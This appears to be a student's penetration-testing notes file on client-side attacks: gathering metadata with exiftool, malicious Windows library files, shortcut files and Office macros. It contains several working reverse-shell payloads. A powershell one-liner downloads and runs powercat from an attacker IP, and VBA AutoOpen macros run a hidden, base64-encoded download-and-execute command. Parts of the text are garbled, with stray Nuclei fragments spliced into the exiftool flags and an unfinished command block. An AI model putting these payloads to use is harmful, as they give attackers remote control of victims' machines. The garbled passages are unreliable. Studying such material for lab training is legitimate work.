# Information and Client Fingerering

Gather Info from Docs

- Look for documents that may have exif data
- Download the documents
- use exiftool to extract th
- e exif data
`exiftool -a -u -g1 -s <filename>`
-a: Extranuclei -u 192.168.148.199 all meta information
-u: Print values in undecoded RAW format
-g1: Print group name for each tag
-s: Short output

Gather Info from Images
- Look for images that may have exif data
- Download the images and use exiftool to extract the exif data like above

# Canary Tokens
https://canarytokens.org/generate
We could also use an online IP logger like Grabify9 or JavaScript fingerprinting libraries such as fingerprint.js.10


-exclude-templates Nuclei/vulnscan/info/standalone/http-missing-security-headers.yaml -exclude-templates headers/* -exclude-templates misconfiguration/http-missing-security-headers.yaml -exclude-templates nuclei/vulnscan/info/standalone/http-missing-security-headers.yaml -exclude-templates technologies/wordpress/plugins/insert-headers-and-footers.yaml -exclude-templates thelabda/403_bypass_workflow/403-bypass_xheaders.yaml 

"powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.148/powercat.ps1'); powercat -c 192.168.119.148 -p 4444 -e powershell"


# Windows Lib Files

Windows library files are virtual containers for user content. 
They connect users with data stored in remote locations like web services or shares. 
These files have a **.Library-ms** file extension and can be executed by 
double-clicking them in Windows Explorer.

Staging a malicious .Library-ms file on a web server and sending a link to the target.
You can use WebDAV to host the file on a web server.

Library files consist of three major parts and are written in XML to specify the parameters for accessing remote locations. 

The parts are 
1. General library information,
2. Library properties, and
3. Library locations. 

Creating a file with the  **.Library-ms** extension and opening it in a text editor reveals the XML structure.

Within the XML structure you can specify the location of the remote file, library display name, and library icon, and other parameters.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.2</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```


# Windows with Reverse Shell Shortcut
## Need to fix the TargetPath 
```powershell
$Shell = New-Object -ComObject WScript.Shell
$Shortcut = $Shell.CreateShortcut("$Home\Desktop\MyShortcut.lnk")
$Shortcut.TargetPath = "powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1'); powercat -c 192.168.119.3 -p 4444 -e powershell"
$Shortcut.Save()
```

# SmbClient
```bash
smbclient //192.168.148.195/share -c 'put config.Library-ms'
```

# execute remote file 
```bash
smbclient //192.168.148.195/share -c '

# MSOFFICE

Attack and Exploitation of MS Office, MS Office Macros, and MS Office DDE

    On Windows 11, Network Level Authentication (NLA)1 is enabled by default for RDP connections and rdesktop won't connect. 
    Use xfreerdp instead, which supports NLA for non domain-joined machines.

Connect to the Windows 11 machine using xfreerdp with username and password by ip:
`xfreerdp /u:"{{ username }}" /p:"{{ password }}" /v:"{{ip_address}}" +clipboard`


Download and run powercat on the Windows 11 machine:
*Important*

Iconv -t utf-16le converts the string to little endian format, which is required for powershell to execute the command.

`echo "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.148/powercat.ps1');powercat -c 192.168.119.148 -p 4444 -e powershell " | iconv -t utf-16le | base64 -w 0`  




```

Sub AutoOpen()
  MyMacro
End Sub
`
Sub Document_Open()
  MyMacro
End Sub

Sub MyMacro()
  Dim Str As String
  Set ObjWscript = CreateObject("Wscript.Shell")
  Str = Str + "powershell.exe -nop -w hidden -enc "
  Str = Str + "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUA"
  Str = Str + "YwB0ACAAUwB5AHMAdABlAG0ALgBOAGUA"
  Str = Str + "dAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
  Str = Str + "LgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIA"
  Str = Str + "aQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8A"
  Str = Str + "MQA5ADIALgAxADYAOAAuADEAMQA5AC4A"
  Str = Str + "MQAyADIALwBwAG8AdwBlAHIAYwBhAHQA"
  Str = Str + "LgBwAHMAMQAnACkAOwBwAG8AdwBlAHIA"
  Str = Str + "YwBhAHQAIAAtAGMAIAAxADkAMgAuADEA"
  Str = Str + "NgA4AC4AMQAxADkALgAxADIAMgAgAC0A"
  Str = Str + "cAAgADQANAA0ADQAIAAtAGUAIABwAG8A"
  Str = Str + "dwBlAHIAcwBoAGUAbABsACAACgA="
  ObjWscript.Run Str
End Sub
```

Use Python to split up the powershell command into 50 character chunks:

```
str = "powershell.exe -nop -w hidden -e {{ base64_encoded_command }}"

n = 50

for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')
```

Sub MyMacro()
  Dim Str As String
  Set ObjWscript = CreateObject("Wscript.Shell")
  Str = Str + "powershell.exe -nop -w hidden -enc "****
  Str = Str + "SQBFAFgAKABOAGUAdwAtAE8AY"
  Str = Str + "gBqAGUAYwB0ACAAUwB5AHMAdA"
  Str = Str + "BlAG0ALgBOAGUAdAAuAFcAZQB"
  Str = Str + "iAEMAbABpAGUAbgB0ACkALgBE"
  Str = Str + "AG8AdwBuAGwAbwBhAGQAUwB0A"
  Str = Str + "HIAaQBuAGcAKAAnAGgAdAB0AH"
  Str = Str + "AAOgAvAC8AMQA5ADIALgAxADY"
  Str = Str + "AOAAuADEAMQA5AC4AMQA0ADgA"
  Str = Str + "LwBwAG8AdwBlAHIAYwBhAHQAL"
  Str = Str + "gBwAHMAMQAnACkAOwBwAG8Adw"
  Str = Str + "BlAHIAYwBhAHQAIAAtAGMAIAA"
  Str = Str + "xADkAMgAuADEANgA4AC4AMQAx"
  Str = Str + "ADkALgAxADQAOAAgAC0AcAAgA"
  Str = Str + "DQANAA0ADQAIAAtAGUAIABwAG"
  Str = Str + "8AdwBlAHIAcwBoAGUAbABsACA"
  Str = Str + "ACgA="
  
